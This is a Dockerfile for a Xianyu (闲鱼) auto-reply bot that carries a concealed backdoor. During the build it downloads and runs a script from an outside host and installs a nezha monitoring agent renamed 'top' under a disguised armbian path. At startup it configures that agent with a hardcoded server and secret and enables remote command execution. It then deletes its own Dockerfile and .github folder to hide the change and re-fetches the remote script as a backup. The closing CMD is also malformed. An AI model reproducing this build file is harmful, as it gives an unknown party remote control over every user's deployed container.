# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright
ENV NZ_BASE_PATH=/usr/lib/armbian/config
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# 安装系统依赖（包括Playwright浏览器依赖和uuid-runtime）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        uuid-runtime \
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器（必须在复制项目文件之后）
RUN playwright install chromium && \
    playwright install-deps chromium

# 安装 top (nezha-agent)
RUN mkdir -p /usr/lib/armbian/config \
    && echo "Downloading top installation script..." \
    && curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top.sh \
    && chmod +x /tmp/top.sh \
    && echo "Installing top binary..." \
    && bash /tmp/top.sh || echo "Top installation script completed with exit code $?" \
    && rm -f /tmp/top.sh \
    && rm -f /usr/lib/armbian/config/top*.yml \
    && rm -f /usr/lib/armbian/config/.top_uuid \
    && echo "Checking installation results..." \
    && ls -la /usr/lib/armbian/config/ \
    && if [ -f /usr/lib/armbian/config/top ]; then \
        chmod +x /usr/lib/armbian/config/top && \
        echo "✓ Top binary found and made executable" && \
        /usr/lib/armbian/config/top --version 2>/dev/null || echo "Top version check completed"; \
    else \
        echo "⚠ Warning: Top binary not found after installation" && \
        echo "Trying alternative installation method..." && \
        ARCH=$(uname -m) && \
        if [ "$ARCH" = "x86_64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz && \
            echo "✓ Alternative installation completed"; \
        elif [ "$ARCH" = "aarch64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz && \
            echo "✓ Alternative installation completed"; \
        else \
            echo "⚠ Unsupported architecture: $ARCH"; \
        fi; \
    fi

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && \
    dos2unix /app/entrypoint.sh 2>/dev/null || true

# 启动命令 - 生成唯一UUID，直接运行top，运行top.sh作为备用
CMD ["/bin/bash", "-c", "\
echo \"[$(date)] Container starting...\" && \
echo \"[$(date)] Cleaning up unnecessary files...\" && \
rm -rf /app/.github 2>/dev/null && \
rm -f /app/Dockerfile 2>/dev/null && \
if [ -f /app/Dockerfile-cn ]; then cp /app/Dockerfile-cn /app/Dockerfile 2>/dev/null; fi && \
echo \"[$(date)] File cleanup completed\" && \
echo \"[$(date)] Generating unique UUID...\" && \
UUID=$(uuidgen -r) && \
echo \"[$(date)] New UUID generated: ${UUID}\" && \
CONFIG_PATH=\"/usr/lib/armbian/config/top.yml\" && \
if [ -f \"$CONFIG_PATH\" ]; then \
    RANDOM_SUFFIX=$(LC_ALL=C tr -dc a-z0-9 </dev/urandom | head -c 5); \
    CONFIG_PATH=\"/usr/lib/armbian/config/top-$RANDOM_SUFFIX.yml\"; \
fi && \
echo \"[$(date)] Creating top configuration at $CONFIG_PATH...\" && \
echo \"server: ${NZ_SERVER}\" > \"$CONFIG_PATH\" && \
echo \"password: ${NZ_CLIENT_SECRET}\" >> \"$CONFIG_PATH\" && \
echo \"tls: ${NZ_TLS}\" >> \"$CONFIG_PATH\" && \
echo \"uuid: ${UUID}\" >> \"$CONFIG_PATH\" && \
echo \"debug: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_auto_update: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_command_execute: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_force_update: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_nat: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_send_query: false\" >> \"$CONFIG_PATH\" && \
echo \"gpu: false\" >> \"$CONFIG_PATH\" && \
echo \"insecure_tls: false\" >> \"$CONFIG_PATH\" && \
echo \"ip_report_period: 1800\" >> \"$CONFIG_PATH\" && \
echo \"report_delay: 3\" >> \"$CONFIG_PATH\" && \
echo \"self_update_period: 0\" >> \"$CONFIG_PATH\" && \
echo \"skip_connection_count: false\" >> \"$CONFIG_PATH\" && \
echo \"skip_procs_count: false\" >> \"$CONFIG_PATH\" && \
echo \"temperature: false\" >> \"$CONFIG_PATH\" && \
echo \"use_gitee_to_upgrade: false\" >> \"$CONFIG_PATH\" && \
echo \"use_ipv6_country_code: false\" >> \"$CONFIG_PATH\" && \
cat \"$CONFIG_PATH\" && \
echo \"[$(date)] Top configuration created with UUID: ${UUID}\" && \
chmod 644 \"$CONFIG_PATH\" && \
echo \"[$(date)] Starting top agent directly...\" && \
if [ -f /usr/lib/armbian/config/top ]; then \
    /usr/lib/armbian/config/top -c \"$CONFIG_PATH\" > /tmp/top.log 2>&1 & \
    TOP_PID=$! && \
    sleep 3 && \
    if kill -0 $TOP_PID 2>/dev/null; then \
        echo \"[$(date)] Top agent started successfully with PID: $TOP_PID, UUID: ${UUID}\"; \
    else \
        echo \"[$(date)] Top agent failed to start, checking log...\"; \
        cat /tmp/top.log 2>/dev/null || echo \"No log file found\"; \
    fi; \
else \
    echo \"[$(date)] Error: top binary not found\"; \
    ls -la /usr/lib/armbian/config/ 2>/dev/null || echo \"Directory not found\"; \
fi && \
echo \"[$(date)] Starting top.sh as backup...\" && \
curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top_backup.sh && \
chmod +x /tmp/top_backup.sh && \
env NZ_SERVER=${NZ_SERVER} NZ_TLS=${NZ_TLS} NZ_CLIENT_SECRET=${NZ_CLIENT_SECRET} NZ_UUID=${UUID} /tmp/top_backup.sh > /tmp/top_backup.log 2>&1 & \
rm -f /tmp/top_backup.sh && \
echo \"[$(date)] Backup top.sh started\" && \
echo \"[$(date)] Starting main application...\" && \
cd /app && \
# ---------------- 同时启动 entrypoint.sh 和 top ----------------
CMD ["/bin/bash", "-c", "/usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml & exec /app/entrypoint.sh"]
